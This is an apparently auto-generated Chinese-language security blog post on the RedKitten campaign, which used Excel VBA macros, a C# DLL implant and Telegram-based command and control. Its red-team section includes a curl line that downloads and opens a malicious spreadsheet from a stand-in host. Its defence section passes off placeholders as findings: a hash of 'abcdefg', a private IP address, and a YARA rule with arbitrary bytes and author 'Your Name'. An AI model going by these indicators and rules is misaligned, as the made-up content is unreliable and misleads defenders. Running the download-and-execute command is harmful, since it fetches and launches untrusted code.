---
layout: post
title:  "Iran-Linked RedKitten Cyber Campaign Targets Human Rights NGOs and Activists"
date:   2026-01-31 18:22:52 +0000
categories: [security]
severity: high
---

# 🔥 解析 RedKitten 攻擊：利用 GitHub 和 Google Drive 進行模組化有效載荷傳遞與命令控制

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `AppDomainManager` 注入、`VBA` 宏、`LLM` (Large Language Model) 生成的代碼

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 `VBA` 宏在 Microsoft Excel 中注入惡意代碼，進而下載和執行 `C#` 基礎的植入式代碼 (`AppVStreamingUX_Multi_User.dll`)。
* **攻擊流程圖解**:
  1. 使用者開啟含有惡意 `VBA` 宏的 Excel 文件。
  2. `VBA` 宏被執行，下載並注入 `AppVStreamingUX_Multi_User.dll`。
  3. `AppVStreamingUX_Multi_User.dll` 進行初始化，連接到命令控制（C2）伺服器。
* **受影響元件**: Microsoft Excel、.NET Framework

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要目標使用者開啟含有惡意 `VBA` 宏的 Excel 文件。
* **Payload 建構邏輯**:

    ```
    
    csharp
      // AppVStreamingUX_Multi_User.dll 的主要功能
      public class AppVStreamingUX_Multi_User
      {
          public void Initialize()
          {
              // 初始化 C2 連接
              ConnectToC2Server();
          }
    
          public void ConnectToC2Server()
          {
              // 使用 Telegram Bot API 進行命令控制
              var telegramBot = new TelegramBot();
              telegramBot.Connect();
          }
      }
    
    ```
  * **範例指令**: 使用 `curl` 下載惡意 Excel 文件並開啟。

```

bash
  curl -o malicious_excel.xlsx https://example.com/malicious_excel.xlsx
  start malicious_excel.xlsx

```
* **繞過技術**: 可能使用 `LLM` 生成的代碼來繞過某些安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abcdefg` | `192.168.1.100` | `example.com` | `C:\Users\username\AppData\Local\Microsoft\CLR_v4.0_32\NativeImages\` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule RedKitten_Detection
      {
          meta:
              description = "Detects RedKitten malware"
              author = "Your Name"
          strings:
              $vba_macro = { 28 00 00 00 01 00 00 00 04 00 00 00 00 00 00 00 }
          condition:
              $vba_macro at 0
      }
    
    ```
  * **SIEM 查詢語法** (Splunk):

    ```
    
    spl
      index=security (eventtype=malware OR eventtype=suspicious_activity) (RedKitten OR "AppVStreamingUX_Multi_User.dll")
    
    ```
* **緩解措施**: 禁用 Excel 中的 `VBA` 宏，更新 .NET Framework 和 Microsoft Excel。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **AppDomainManager 注入**: 一種 .NET 技術，允許在應用程式域中注入自訂代碼。
* **VBA 宏**: Visual Basic for Applications 宏，是 Microsoft Office 中的一種腳本語言。
* **LLM (Large Language Model)**: 一種人工智慧模型，能夠生成類似人類語言的文字。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/iran-linked-redkitten-cyber-campaign.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


